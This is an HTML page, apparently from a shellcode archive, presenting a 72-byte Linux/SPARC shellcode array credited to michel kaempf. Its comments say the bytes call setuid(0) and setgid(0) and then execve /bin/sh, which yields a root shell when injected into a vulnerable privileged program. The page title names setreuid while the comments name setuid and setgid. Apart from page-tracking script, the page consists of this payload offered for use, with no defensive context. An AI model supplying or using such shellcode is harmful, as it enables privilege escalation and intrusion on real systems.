<html><head><title>Linux/sparc - setreuid(0,0)&amp;standard execve() - 72 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  Linux/SPARC
 *
 *  setreuid(0, 0); (necessary, /bin/sh drops privs), standard execve().
 */

char c0de[] = /* by michel kaempf */

  /* setuid( 0 ); */
  &quot;\x90\x1a\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x10&quot;
  /* setgid( 0 ); */
  &quot;\x90\x1a\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x10&quot;
  /* Aleph One :) */
  &quot;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&quot;
  &quot;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&quot;
  &quot;\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
